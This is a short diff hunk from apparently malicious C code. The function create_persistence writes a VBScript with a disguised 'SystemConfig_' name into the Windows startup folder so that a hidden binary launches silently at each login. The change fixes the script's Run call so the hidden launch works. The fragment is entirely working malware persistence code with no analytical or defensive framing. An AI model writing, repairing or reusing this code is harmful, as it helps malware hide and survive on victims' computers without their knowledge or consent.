@@ -88,7 +88,7 @@ void create_persistence(const char *method) {
         snprintf(hidden_service, sizeof(hidden_service), "SystemConfig_%s", rand_str);
         snprintf(vbs_path, MAX_PATH, "%s\\%.8s.vbs", startup_folder, hidden_service);
         char vbs_content[512];
-        snprintf(vbs_content, sizeof(vbs_content), "Set WShell = CreateObject(\"WScript.Shell\")\nWShell.Run \"\"\"%s\"\"\", 0, NULL\n", hidden_binary);
+        snprintf(vbs_content, sizeof(vbs_content), "Set WShell = CreateObject(\"WScript.Shell\")\nWShell.Run \"\"\"%s\"\"\", 0, False\n", hidden_binary);
         HANDLE hFile = CreateFileA(vbs_path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
         if (hFile == INVALID_HANDLE_VALUE) {
             return;
